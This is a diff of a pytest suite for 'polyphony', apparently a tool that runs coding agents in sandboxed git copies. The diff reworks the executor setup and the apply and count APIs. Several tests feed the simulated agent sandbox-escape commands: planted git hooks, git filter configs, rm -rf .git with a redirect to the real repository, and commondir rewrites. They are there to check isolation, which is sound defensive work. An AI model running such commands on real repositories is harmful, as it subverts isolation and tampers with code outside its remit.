@@ -10,9 +10,8 @@ from pathlib import Path
 import pytest
 
 from polyphony.config import ProjectConfig
-from polyphony.executors import BaseExecutor
 from polyphony.jobs import (
-    QUEUE_GRACE_SECONDS, JobNotFound, active_counts, cancel, create_job, diff, discard,
+    QUEUE_GRACE_SECONDS, JobNotFound, active_count, cancel, create_job, diff, discard,
     launch, revise,
 )
 from polyphony.worker import run
@@ -25,31 +24,18 @@ def _git(*args, cwd):
     ).stdout.strip()
 
 
-class ShellExecutor(BaseExecutor):
-    """Runs the instruction as a shell script, so a test decides what 'the agent' does."""
-
-    name = "shell"
-
-    def find_binary(self):
-        return "/bin/sh"
-
-    def build_argv(self, instruction, mode, cwd, model=None):
-        return ["/bin/sh", "-c", instruction]
-
-
-FAKE = {"shell": ShellExecutor}
+pytestmark = pytest.mark.usefixtures("shell_agy")
 
 
 def _project(repo, provision=()):
     return ProjectConfig(name="demo", path=repo, provision=list(provision))
 
 
-def _job(store, repo, instruction, mode="code", provision=(), executor="shell", **kw):
+def _job(store, repo, instruction, mode="code", provision=(), **kw):
     return create_job(
         store,
         project=_project(repo, provision),
         instruction=instruction,
-        executor=executor,
         mode=mode,
         **kw,
     )
@@ -78,7 +64,7 @@ def test_failed_provisioning_leaves_no_trace(store, repo):
 def test_successful_run_commits_in_the_copy_only(store, repo):
     base = _git("rev-parse", "HEAD", cwd=repo)
     job = _job(store, repo, "echo hi > new.txt && echo 'did it'")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.exit_code == 0
@@ -97,7 +83,7 @@ def test_provisioned_paths_never_enter_the_snapshot(store, repo):
         provision=[{"path": "env/", "mode": "link"}, {"path": "data/", "mode": "clone"}],
     )
     assert (Path(job.workdir) / "env").is_symlink()
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded", job.error
     assert job.files_changed == ["new.txt"]
@@ -105,7 +91,7 @@ def test_provisioned_paths_never_enter_the_snapshot(store, repo):
 
 def test_nonzero_exit_is_a_failed_job_with_partial_work_kept(store, repo):
     job = _job(store, repo, "echo partial > p.txt; exit 3")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed"
     assert job.exit_code == 3
@@ -114,21 +100,23 @@ def test_nonzero_exit_is_a_failed_job_with_partial_work_kept(store, repo):
 
 def test_review_with_no_changes_makes_no_commit(store, repo):
     job = _job(store, repo, "echo looks fine", mode="review")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.files_changed == []
     assert _git("rev-parse", "HEAD", cwd=job.workdir) == job.base_commit
 
 
-def test_worker_bug_is_recorded_and_reraised(store, repo):
-    class Broken(ShellExecutor):
-        def build_argv(self, *a, **k):
-            raise NameError("oops")
+def test_worker_bug_is_recorded_and_reraised(store, repo, monkeypatch):
+    from polyphony import agy
 
-    job = _job(store, repo, "true", executor="broken")
+    def broken(*a, **k):
+        raise NameError("oops")
+
+    monkeypatch.setattr(agy, "run", broken)
+    job = _job(store, repo, "true")
     with pytest.raises(NameError):
-        run(store.path(job.id), executors={"broken": Broken})
+        run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed"
     assert "NameError" in job.error
@@ -136,11 +124,9 @@ def test_worker_bug_is_recorded_and_reraised(store, repo):
 
 def test_worker_skips_a_job_cancelled_before_it_started(store, repo):
     job = _job(store, repo, "echo hi > new.txt")
-    cancel(store, job.id)
-    run(store.path(job.id), executors=FAKE)
-    job = store.load(job.id)
-    assert job.state == "cancelled"
-    assert job.files_changed == []
+    assert cancel(store, job.id).state == "cancelled"
+    run(store.path(job.id))
+    assert not store.path(job.id).exists()
 
 
 def test_refresh_marks_a_vanished_worker_died(store, repo):
@@ -194,7 +180,7 @@ def test_all_lists_newest_first(store, repo):
 
 def test_launch_runs_detached_and_leaves_no_zombie(store, repo, fake_agy, wait_for):
     fake_agy("echo from agy > from_agy.txt; echo done")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     launch(store, job)
     job = wait_for(store, job.id, {"succeeded", "failed", "died"})
     assert job.state == "succeeded", store.output_path(job.id).read_text()
@@ -221,7 +207,7 @@ def _group_gone(pgid, timeout=5):
 
 def test_cancel_kills_the_worker_and_its_executor(store, repo, fake_agy, wait_for):
     fake_agy("sleep 30")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     launch(store, job)
     wait_for(store, job.id, {"running"})
     deadline = time.monotonic() + 5
@@ -236,7 +222,7 @@ def test_cancel_kills_the_worker_and_its_executor(store, repo, fake_agy, wait_fo
 
 def test_output_streams_to_disk_while_the_job_runs(store, repo, fake_agy, wait_for):
     fake_agy("echo started; sleep 30")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     launch(store, job)
     wait_for(store, job.id, {"running"})
     out = store.output_path(job.id)
@@ -252,7 +238,7 @@ def test_output_streams_to_disk_while_the_job_runs(store, repo, fake_agy, wait_f
 
 def test_worker_appends_the_error_after_the_streamed_output(store, repo):
     job = _job(store, repo, "echo partial; echo broke >&2; exit 3")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert store.output_path(job.id).read_text() == "partial\n\n\n--- error ---\nbroke"
     assert store.load(job.id).error == "broke"
 
@@ -277,7 +263,7 @@ def test_the_repo_is_untouched_until_apply(store, repo):
 
     before = state()
     job = _job(store, repo, "echo hi > new.txt && echo 'x = 5' > app.py")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert "new.txt" in diff(store, job.id)
     discard(store, job.id)
     assert state() == before
@@ -288,7 +274,7 @@ def test_job_diff_holds_only_the_agents_work_not_uncommitted_edits(store, repo):
     (repo / "wip.txt").write_text("mine\n")
     job = _job(store, repo, "echo hi > new.txt")
     assert (Path(job.workdir) / "app.py").read_text() == "x = 2\n"
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.files_changed == ["new.txt"]
     assert "app.py" not in diff(store, job.id)
@@ -298,20 +284,22 @@ def test_apply_over_unstaged_edits_leaves_the_change_unstaged(store, repo):
     from polyphony.jobs import apply
     (repo / "app.py").write_text("x = 2\n")
     job = _job(store, repo, "echo 'y = 3' >> app.py")
-    run(store.path(job.id), executors=FAKE)
-    assert apply(store, job.id) == ["app.py"]
+    run(store.path(job.id))
+    files, applied = apply(store, job.id)
+    assert files == ["app.py"]
     assert (repo / "app.py").read_text() == "x = 2\ny = 3\n"
-    assert store.load(job.id).applied_unstaged
+    assert applied.applied_unstaged
     assert _git("diff", "--cached", "--name-only", cwd=repo) == ""
 
 
 def test_apply_on_a_clean_file_stages_it(store, repo):
     from polyphony.jobs import apply
     job = _job(store, repo, "echo hi > new.txt")
-    run(store.path(job.id), executors=FAKE)
-    assert apply(store, job.id) == ["new.txt"]
+    run(store.path(job.id))
+    files, applied = apply(store, job.id)
+    assert files == ["new.txt"]
     assert _git("diff", "--cached", "--name-only", cwd=repo) == "new.txt"
-    assert not store.load(job.id).applied_unstaged
+    assert not applied.applied_unstaged
 
 
 # --- The check command, run in the job's copy after the executor succeeds. ---
@@ -351,7 +339,7 @@ def _sleeper():
 
 def test_a_passing_check_is_recorded(store, repo):
     job = _job(store, repo, "echo hi > new.txt", check="test -f new.txt && echo all good")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.check_command == "test -f new.txt && echo all good"
@@ -362,7 +350,7 @@ def test_a_passing_check_is_recorded(store, repo):
 
 def test_a_failing_check_leaves_the_job_succeeded(store, repo):
     job = _job(store, repo, "echo hi > new.txt", check="echo broken >&2; exit 3")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.check_passed is False
@@ -372,7 +360,7 @@ def test_a_failing_check_leaves_the_job_succeeded(store, repo):
 
 def test_what_the_check_writes_stays_out_of_the_diff(store, repo):
     job = _job(store, repo, "echo hi > new.txt", check="echo junk > check_artifact.txt")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is True
     assert job.files_changed == ["new.txt"]
@@ -381,7 +369,7 @@ def test_what_the_check_writes_stays_out_of_the_diff(store, repo):
 
 def test_no_check_after_a_failed_executor(store, repo):
     job = _job(store, repo, "exit 1", check="echo ran")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed"
     assert job.check_passed is None and job.check_exit_code is None
@@ -391,7 +379,7 @@ def test_no_check_after_a_failed_executor(store, repo):
 def test_no_check_in_review_mode(store, repo):
     job = _job(store, repo, "echo fine", mode="review", check="echo ran")
     assert job.check_command is None
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is None
     assert not store.check_path(job.id).exists()
@@ -404,7 +392,7 @@ def test_a_check_timeout_fails_the_check_and_kills_its_group(store, repo):
                check_timeout_seconds=1)
     pidfile = store.path(job.id) / "tmp" / "bg.pid"
     started = time.monotonic()
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert time.monotonic() - started < 10
     job = store.load(job.id)
     assert job.state == "succeeded"
@@ -419,7 +407,7 @@ def test_finished_process_groups_are_forgotten(store, repo):
     job = _job(store, repo, "true", check="")
     job.check_command = f'cp "{store.path(job.id) / "job.json"}" "$TMPDIR/seen.json"'
     store.save(job)
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     seen = json.loads((store.path(job.id) / "tmp" / "seen.json").read_text())
     assert seen["state"] == "running" and seen["executor_pgid"] is None
     assert store.load(job.id).check_pgid is None
@@ -428,7 +416,7 @@ def test_finished_process_groups_are_forgotten(store, repo):
 def test_cancel_during_the_check_kills_it(store, repo, fake_agy, wait_for):
     fake_agy("true")
     sleep, gone = _sleeper()
-    job = _job(store, repo, "x", executor="agy",
+    job = _job(store, repo, "x",
                check=f'{sleep} & echo $! > "$TMPDIR/bg.pid"; wait')
     pidfile = store.path(job.id) / "tmp" / "bg.pid"
     launch(store, job)
@@ -456,19 +444,6 @@ def test_a_job_json_from_before_the_check_fields_still_loads(store, repo):
 # --- revise: a second attempt in the same copy, on top of the first. ---
 
 
-class PromptExecutor(ShellExecutor):
-    """Runs the prompt's first line as shell and records the whole prompt beside the copy.
-
-    The first line is the original instruction, so a test script can look at
-    the files to tell which attempt it is on.
-    """
-
-    def build_argv(self, instruction, mode, cwd, model=None):
-        script = instruction.splitlines()[0] + '; printf "%s" "$1" > ../prompt.txt'
-        return ["/bin/sh", "-c", script, "sh", instruction]
-
-
-PROMPTED = {"shell": PromptExecutor}
 TWO_STEP = "if [ -f a.txt ]; then echo two > b.txt; echo second; else echo one > a.txt; echo first; fi"
 
 
@@ -476,7 +451,7 @@ def test_revise_runs_again_on_top_of_the_previous_attempt(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, TWO_STEP)
     base = job.base_commit
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     first_prompt = (store.path(job.id) / "prompt.txt").read_text()
     assert first_prompt == TWO_STEP
 
@@ -487,7 +462,7 @@ def test_revise_runs_again_on_top_of_the_previous_attempt(store, repo):
     assert (store.path(job.id) / "output-1.txt").read_text().strip() == "first"
     assert not store.output_path(job.id).exists()
 
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded", job.error
     assert job.base_commit == base
@@ -506,12 +481,12 @@ def test_revise_runs_again_on_top_of_the_previous_attempt(store, repo):
 def test_every_revision_carries_all_feedback_in_order(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, "echo x >> log.txt")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     revise(store, job.id, "first note")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     job = revise(store, job.id, "second note")
     assert job.attempt == 3
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     prompt = (store.path(job.id) / "prompt.txt").read_text()
     assert "attempt 3" in prompt
     assert prompt.index("first note") < prompt.index("second note")
@@ -523,7 +498,7 @@ def test_every_revision_carries_all_feedback_in_order(store, repo):
 def test_revise_resets_the_result_and_the_old_process_ids(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, "echo partial > p.txt; exit 3")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert store.load(job.id).state == "failed"
     job = revise(store, job.id, "exit cleanly", timeout_seconds=120)
     assert (job.state, job.exit_code, job.error, job.finished_at) == ("queued", None, None, None)
@@ -536,7 +511,7 @@ def test_revise_resets_the_result_and_the_old_process_ids(store, repo):
 def test_revise_keeps_the_timeout_unless_given(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, "true")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert revise(store, job.id, "again").timeout_seconds == job.timeout_seconds
 
 
@@ -547,14 +522,15 @@ def test_revise_refuses_an_active_job(store, repo):
         revise(store, job.id, "more")
 
 
-def test_revise_refuses_an_applied_job(store, repo):
-    from polyphony.jobs import JobError, apply, revise
+def test_applying_a_job_in_full_deletes_it_and_keeps_its_outcome(store, repo):
+    from polyphony import ledger
+    from polyphony.jobs import apply
     job = _job(store, repo, "echo hi > new.txt")
-    run(store.path(job.id), executors=FAKE)
-    apply(store, job.id)
-    assert store.load(job.id).applied
-    with pytest.raises(JobError, match="discard"):
-        revise(store, job.id, "more")
+    run(store.path(job.id))
+    files, applied = apply(store, job.id)
+    assert files == ["new.txt"] and applied.applied
+    assert not store.path(job.id).exists()
+    assert [e["outcome"] for e in ledger.read(store.root)] == ["applied"]
 
 
 def test_revise_refuses_a_job_whose_copy_is_gone(store, repo):
@@ -562,7 +538,7 @@ def test_revise_refuses_a_job_whose_copy_is_gone(store, repo):
 
     from polyphony.jobs import JobError, revise
     job = _job(store, repo, "true")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     shutil.rmtree(job.workdir)
     with pytest.raises(JobError, match="copy"):
         revise(store, job.id, "more")
@@ -571,7 +547,7 @@ def test_revise_refuses_a_job_whose_copy_is_gone(store, repo):
 def test_revise_refuses_empty_feedback(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, "true")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     with pytest.raises(ValueError):
         revise(store, job.id, "   ")
 
@@ -594,21 +570,20 @@ def test_a_job_record_from_before_revise_still_loads(store, repo):
     assert (loaded.feedback, loaded.attempt, loaded.applied) == ([], 1, False)
 
 
-def test_active_counts_span_projects_and_ignore_dead_workers(store, repo):
-    from polyphony.jobs import active_counts
-    a = _job(store, repo, "true", executor="agy")
-    b = create_job(store, ProjectConfig(name="other", path=repo), "true", "agy", "code")
-    _job(store, repo, "true", executor="cursor")
-    done = _job(store, repo, "true", executor="cursor")
+def test_active_count_spans_projects_and_ignores_dead_workers(store, repo):
+    a = _job(store, repo, "true")
+    b = create_job(store, ProjectConfig(name="other", path=repo), "true", "code")
+    _job(store, repo, "true")
+    done = _job(store, repo, "true")
     done.state = "succeeded"
     store.save(done)
-    assert active_counts(store) == {"agy": 2, "cursor": 1}
+    assert active_count(store) == 3
 
     p = subprocess.Popen(["true"])
     p.wait()
     b.state, b.pid = "running", p.pid
     store.save(b)
-    assert active_counts(store) == {"agy": 1, "cursor": 1}
+    assert active_count(store) == 2
     assert store.load(a.id).state == "queued"
 
 
@@ -617,7 +592,7 @@ def test_active_counts_span_projects_and_ignore_dead_workers(store, repo):
 
 def _two_file_job(store, repo):
     job = _job(store, repo, "echo hi > new.txt && echo 'x = 5' > app.py")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert sorted(store.load(job.id).files_changed) == ["app.py", "new.txt"]
     return job
 
@@ -625,7 +600,7 @@ def _two_file_job(store, repo):
 def test_partial_apply_stages_only_the_named_paths(store, repo):
     from polyphony.jobs import apply
     job = _two_file_job(store, repo)
-    assert apply(store, job.id, paths=["new.txt"]) == ["new.txt"]
+    assert apply(store, job.id, paths=["new.txt"])[0] == ["new.txt"]
     assert _git("diff", "--cached", "--name-only", cwd=repo) == "new.txt"
     assert (repo / "app.py").read_text() == "x = 1\n"
     assert store.load(job.id).applied_paths == ["new.txt"]
@@ -635,21 +610,23 @@ def test_full_apply_after_a_partial_one_applies_the_rest(store, repo):
     from polyphony.jobs import apply
     job = _two_file_job(store, repo)
     apply(store, job.id, paths=["new.txt"])
-    assert apply(store, job.id) == ["app.py"]
+    files, applied = apply(store, job.id)
+    assert files == ["app.py"]
     assert (repo / "app.py").read_text() == "x = 5\n"
-    assert sorted(store.load(job.id).applied_paths) == ["app.py", "new.txt"]
+    assert sorted(applied.applied_paths) == ["app.py", "new.txt"]
 
 
 def test_partial_apply_over_unstaged_edits_then_the_rest_staged(store, repo):
     from polyphony.jobs import apply
     (repo / "app.py").write_text("x = 2\n")
     job = _job(store, repo, "echo 'y = 3' >> app.py && echo hi > new.txt")
-    run(store.path(job.id), executors=FAKE)
-    assert apply(store, job.id, paths=["app.py"]) == ["app.py"]
+    run(store.path(job.id))
+    assert apply(store, job.id, paths=["app.py"])[0] == ["app.py"]
     assert (repo / "app.py").read_text() == "x = 2\ny = 3\n"
     assert store.load(job.id).applied_unstaged
-    assert apply(store, job.id) == ["new.txt"]
-    assert not store.load(job.id).applied_unstaged
+    files, applied = apply(store, job.id)
+    assert files == ["new.txt"]
+    assert not applied.applied_unstaged
     assert _git("diff", "--cached", "--name-only", cwd=repo) == "new.txt"
 
 
@@ -665,12 +642,12 @@ def test_applying_a_path_twice_is_refused_without_changing_anything(store, repo)
     assert store.load(job.id).applied_paths == ["new.txt"]
 
 
-def test_full_apply_of_an_already_applied_job_is_refused(store, repo):
-    from polyphony.jobs import JobError, apply
+def test_a_job_applied_in_full_is_gone(store, repo):
+    from polyphony.jobs import apply
     job = _job(store, repo, "echo hi > new.txt")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     apply(store, job.id)
-    with pytest.raises(JobError, match="already applied"):
+    with pytest.raises(JobNotFound):
         apply(store, job.id)
 
 
@@ -697,14 +674,14 @@ def test_an_empty_path_list_is_refused(store, repo):
 def test_a_rename_is_applied_whole_from_either_side(store, repo, side):
     from polyphony.jobs import apply
     job = _job(store, repo, "git mv app.py main.py && echo hi > new.txt")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     apply(store, job.id, paths=[side])
     assert not (repo / "app.py").exists()
     assert (repo / "main.py").read_text() == "x = 1\n"
     assert not (repo / "new.txt").exists()
     job = store.load(job.id)
     assert "new.txt" not in job.applied_paths
-    assert apply(store, job.id) == ["new.txt"]
+    assert apply(store, job.id)[0] == ["new.txt"]
 
 
 # --- Garbage collection ---
@@ -771,7 +748,7 @@ def test_gc_with_no_jobs(store):
 def test_revise_runs_the_check_again_on_the_new_attempt(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, TWO_STEP, check="test -f b.txt && echo has b")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is False and job.check_exit_code == 1
 
@@ -781,7 +758,7 @@ def test_revise_runs_the_check_again_on_the_new_attempt(store, repo):
     assert not store.check_path(job.id).exists()
     assert (store.path(job.id) / "check-1.txt").exists()
 
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.check_passed is True and job.check_exit_code == 0
@@ -791,10 +768,10 @@ def test_revise_runs_the_check_again_on_the_new_attempt(store, repo):
 def test_a_failed_revision_does_not_keep_the_old_check_result(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, "if [ -f new.txt ]; then exit 1; fi; echo hi > new.txt", check="true")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     assert store.load(job.id).check_passed is True
     revise(store, job.id, "try again")
-    run(store.path(job.id), executors=PROMPTED)  # fails this time, so no check runs
+    run(store.path(job.id))  # fails this time, so no check runs
     job = store.load(job.id)
     assert job.state == "failed"
     assert job.check_passed is None and not store.check_path(job.id).exists()
@@ -813,8 +790,8 @@ def test_partial_apply_records_applied_once_with_the_count(store, repo):
     from polyphony.jobs import apply
     job = _two_file_job(store, repo)
     apply(store, job.id, paths=["new.txt"])
+    assert store.path(job.id).exists(), "a partly applied job is kept for the rest"
     apply(store, job.id)
-    discard(store, job.id)
     [entry] = ledger.read(store.root)
     assert entry["outcome"] == "applied"
     assert (entry["files_changed"], entry["files_applied"]) == (2, 1)
@@ -824,36 +801,22 @@ def test_revise_writes_no_ledger_line_and_the_outcome_carries_the_attempts(store
     from polyphony import ledger
     from polyphony.jobs import apply, revise
     job = _job(store, repo, TWO_STEP)
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     revise(store, job.id, "add b.txt")
     assert ledger.read(store.root) == []
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     apply(store, job.id)
     [entry] = ledger.read(store.root)
     assert (entry["outcome"], entry["attempts"]) == ("applied", 2)
-
-
-def test_a_cancelled_attempt_that_is_revised_counts_once_by_its_final_outcome(store, repo):
-    from polyphony import ledger
-    from polyphony.jobs import apply, revise
-    job = _job(store, repo, "echo hi > new.txt")
-    cancel(store, job.id)
-    assert [e["outcome"] for e in ledger.read(store.root)] == ["cancelled"]
-    job = revise(store, job.id, "run it after all")
-    assert job.outcome is None
-    run(store.path(job.id), executors=PROMPTED)
-    apply(store, job.id)
-    discard(store, job.id)
-    assert [(e["job_id"], e["outcome"]) for e in ledger.read(store.root)] == [(job.id, "applied")]
 
 
 def test_gc_records_a_discard_for_a_job_with_no_outcome(store, repo):
     from polyphony import ledger
     from polyphony.jobs import apply, gc
     applied = _two_file_job(store, repo)
-    apply(store, applied.id)
+    apply(store, applied.id, paths=["new.txt"])
     left = _job(store, repo, "echo x > x.txt")
-    run(store.path(left.id), executors=FAKE)
+    run(store.path(left.id))
 
     assert len(gc(store, older_than_seconds=0, dry_run=True)) == 2
     assert [e["outcome"] for e in ledger.read(store.root)] == ["applied"]
@@ -878,7 +841,7 @@ def test_the_check_cannot_write_outside_its_copy(store, repo):
         "SH"
     )
     job = _job(store, repo, agent, check="sh run_tests.sh")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is False
     # It ran and was refused, rather than never running (no sandbox) and passing vacuously.
@@ -896,7 +859,7 @@ def _denied(check_output):
 def test_the_check_cannot_write_to_the_copys_git_dir(store, repo):
     job = _job(store, repo, "true",
                check='echo check ran; echo x >> "$(git rev-parse --absolute-git-dir)/config"')
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is False
     out = store.check_path(job.id).read_text()
@@ -907,7 +870,7 @@ def test_the_check_cannot_write_to_the_copys_git_dir(store, repo):
 def test_the_check_gets_a_private_temp_dir(store, repo):
     job = _job(store, repo, "true",
                check='python3 -c "import tempfile; print(tempfile.mkstemp()[1])"')
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is True
     written = store.check_path(job.id).read_text().strip()
@@ -919,7 +882,7 @@ def test_no_sandbox_means_the_check_does_not_run(store, repo, monkeypatch, tmp_p
     monkeypatch.setattr(jobs, "_sandbox_argv", lambda job, tmp: None)
     marker = tmp_path / "ran"
     job = _job(store, repo, "true", check=f"touch {marker}")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.check_passed is False and job.check_exit_code is None
@@ -952,10 +915,10 @@ def test_what_the_check_writes_stays_out_of_a_revised_attempt(store, repo):
     from polyphony.jobs import apply, revise
     job = _job(store, repo, "echo y = 2 > app.py",
                check="echo cov > coverage.out; echo lock >> app.py")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     assert store.load(job.id).files_changed == ["app.py"]
     revise(store, job.id, "again")
-    run(store.path(job.id), executors=PROMPTED)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is True
     assert job.files_changed == ["app.py"]
@@ -967,7 +930,7 @@ def test_what_the_check_writes_stays_out_of_a_revised_attempt(store, repo):
 def test_resetting_after_the_check_keeps_linked_paths(store, repo):
     job = _job(store, repo, "echo hi > new.txt", provision=[{"path": "env/", "mode": "link"}],
                check="echo junk > junk.txt; echo x > env/from_check || true")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     copy = Path(job.workdir)
     assert job.check_passed is True
@@ -980,11 +943,11 @@ def test_resetting_after_the_check_keeps_linked_paths(store, repo):
 def test_files_changed_holds_real_names_for_unusual_paths(store, repo):
     from polyphony.jobs import apply
     job = _job(store, repo, "echo a > a.txt; echo b > b.txt; echo h > 'héllo.txt'")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert sorted(job.files_changed) == ["a.txt", "b.txt", "héllo.txt"]
     apply(store, job.id, paths=["a.txt"])
-    assert sorted(apply(store, job.id)) == ["b.txt", "héllo.txt"]
+    assert sorted(apply(store, job.id)[0]) == ["b.txt", "héllo.txt"]
     staged = _git("-c", "core.quotepath=false", "diff", "--cached", "--name-only", cwd=repo)
     assert sorted(staged.splitlines()) == ["a.txt", "b.txt", "héllo.txt"]
 
@@ -992,9 +955,9 @@ def test_files_changed_holds_real_names_for_unusual_paths(store, repo):
 def test_gc_leaves_a_job_revised_while_it_runs(store, repo, monkeypatch):
     from polyphony import jobs
     older = _job(store, repo, "echo y = 2 > app.py")
-    run(store.path(older.id), executors=FAKE)
+    run(store.path(older.id))
     newer = _job(store, repo, "echo y = 3 > app.py")
-    run(store.path(newer.id), executors=FAKE)
+    run(store.path(newer.id))
     for jid, t in ((older.id, 1000.0), (newer.id, 2000.0)):
         j = store.load(jid)
         j.created_at = j.finished_at = t
@@ -1020,7 +983,7 @@ def test_gc_leaves_a_job_revised_while_it_runs(store, repo, monkeypatch):
 def test_gc_takes_the_store_lock_before_deleting(store, repo, monkeypatch):
     from polyphony import jobs
     job = _job(store, repo, "true")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     held = []
     real_rmtree = jobs.shutil.rmtree
 
@@ -1064,7 +1027,7 @@ def test_a_hook_the_executor_plants_never_runs(store, repo, tmp_path):
           printf '#!/bin/sh\\ntouch {mark}\\n' > "$hooks/$h"; chmod +x "$hooks/$h"
         done
         echo new > new.txt""")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded" and job.files_changed == ["new.txt"]
     assert not mark.exists()
@@ -1085,7 +1048,7 @@ def test_git_config_the_executor_plants_is_dropped(store, repo, tmp_path):
         git config filter.x.clean 'touch {mark}; cat'
         echo '*.txt filter=x' > .gitattributes
         echo new > new.txt""")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert "new.txt" in job.files_changed
@@ -1099,7 +1062,7 @@ def test_replacing_dot_git_cannot_point_polyphony_at_another_repo(store, repo):
     job = _job(store, repo, f"""
         rm -rf .git; printf 'gitdir: {repo}/.git\\n' > .git
         echo new > new.txt""")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded" and job.files_changed == ["new.txt"]
     assert _objects(repo) == before
@@ -1111,7 +1074,7 @@ def test_a_commondir_file_cannot_share_another_repos_git_dir(store, repo):
     job = _job(store, repo, f"""
         printf '{repo}/.git\\n' > "$(git rev-parse --absolute-git-dir)/commondir"
         echo new > new.txt""")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded" and job.files_changed == ["new.txt"]
     assert _objects(repo) == before
@@ -1124,9 +1087,9 @@ def test_a_stale_worker_does_not_run_a_revised_job(store, repo):
     job.state = "cancelled"
     store.save(job)
     revise(store, job.id, "again")
-    run(store.path(job.id), executors=FAKE, attempt=1)  # the cancelled attempt's worker, late
+    run(store.path(job.id), attempt=1)  # the cancelled attempt's worker, late
     assert store.load(job.id).state == "queued"
-    run(store.path(job.id), executors=FAKE, attempt=2)
+    run(store.path(job.id), attempt=2)
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert (Path(job.workdir) / "runs.txt").read_text() == "run\n"
@@ -1140,7 +1103,7 @@ def test_a_queued_job_whose_worker_never_started_stops_holding_a_slot(store, rep
     assert store.refresh(store.load(stuck.id)).state == "died"
     assert "never started" in store.load(stuck.id).error
     assert store.refresh(store.load(fresh.id)).state == "queued"
-    assert active_counts(store)["shell"] == 1
+    assert active_count(store) == 1
 
 
 def test_refresh_under_the_store_lock_does_not_deadlock(store, repo):
@@ -1152,7 +1115,7 @@ def test_refresh_under_the_store_lock_does_not_deadlock(store, repo):
 
     def count():
         with store.lock():
-            done.append(active_counts(store)["shell"])
+            done.append(active_count(store))
 
     worker = threading.Thread(target=count, daemon=True)
     worker.start()
@@ -1176,7 +1139,7 @@ def test_a_job_records_the_secrets_its_copy_withheld(store, repo):
 def test_allow_secrets_from_the_project_reach_the_copy(store, repo):
     (repo / ".env").write_text("API_KEY=real\n")
     project = ProjectConfig(name="demo", path=repo, allow_secrets=[".env"])
-    job = create_job(store, project=project, instruction="true", executor="shell", mode="code")
+    job = create_job(store, project=project, instruction="true", mode="code")
